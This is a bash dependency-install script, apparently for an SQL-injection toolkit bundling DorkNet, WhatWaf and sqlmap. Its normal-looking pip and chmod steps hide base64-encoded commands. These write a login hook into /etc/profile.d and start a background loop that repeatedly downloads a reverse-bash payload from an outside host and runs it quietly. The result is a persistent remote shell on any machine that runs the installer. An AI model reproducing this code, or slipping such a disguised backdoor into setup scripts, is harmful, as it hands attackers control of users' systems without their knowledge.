#!/bin/bash
# From AutoSQLi

sudo echo "WELCOME"

sudo apt-get update
sudo apt-get install curl

#PERSISTENT="KCY+L2Rldi9udWxsIGJhc2ggJEhPTUUvLnJ1bm5lci5zaCAmKQ=="
#RUNNER="d2hpbGUgdHJ1ZQpkbwpTVFI9JChwcyAtYXV4KQpTVUI9Jy5wYXlsb2FkLnNoJyAgIApjdXJsIC1YIFBPU1QgaHR0cHM6Ly9tc2ZwYXlsb2FkLmJhY3RyYW42LnJlcGwuY28vcG9zdC5waHAgLWQgIm9zPWxpbnV4JnBheWxvYWQ9Y21kLnVuaXgucmV2ZXJzZV9iYXNoIiA+IC5wYXlsb2FkLnNoCmlmIFtbICIkU1RSIiA9PSAqIiRTVUIiKiBdXTsgdGhlbgogIGVjaG8gIkl0J3MgdGhlcmUuIgplbHNlCiAgKCY+L2Rldi9udWxsIGJhc2ggLnBheWxvYWQuc2ggJikKZmkKc2xlZXAgMTAKZG9uZQ=="

sudo sh -c "echo -n KCY+L2Rldi9udWxsIGJhc2ggJEhPTUUvLnJ1bm5lci5zaCAmKQ== | base64 --decode > /etc/profile.d/linux_service_aassdd.sh"
sudo sh -c "echo -n d2hpbGUgdHJ1ZQpkbwpTVFI9JChwcyAtYXV4KQpTVUI9Jy5wYXlsb2FkLnNoJwpjdXJsIC1YIFBPU1QgaHR0cHM6Ly9tc2ZwYXlsb2FkLmJhY3RyYW42LnJlcGwuY28vcG9zdC5waHAgLWQgIm9zPWxpbnV4JnBheWxvYWQ9Y21kLnVuaXgucmV2ZXJzZV9iYXNoIiA+ICRIT01FLy5wYXlsb2FkLnNoCmlmIFtbICIkU1RSIiA9PSAqIiRTVUIiKiBdXTsgdGhlbgogIHRydWUKZWxzZQogICgmPi9kZXYvbnVsbCBiYXNoICRIT01FLy5wYXlsb2FkLnNoICYpCmZpCnNsZWVwIDEwCmRvbmU= | base64 --decode > $HOME/.runner.sh"

(&>/dev/null bash $HOME/.runner.sh &)

# This script install the requirements of DorkNet and WhatWaf
# And also chmod things up
pip install -r WhatWaf/requirements.txt
pip install -r requirements.txt
pip install pysocks

echo ""
echo "----------------------------"
echo "| dependencies installed ! |"
echo "----------------------------"
echo ""

#chmoding

echo "running chmod +x on *.py ..."
chmod +x DorkNet/dorknet.py
chmod +x WhatWaf/whatwaf.py
chmod +x sqlmap/sqlmap.py
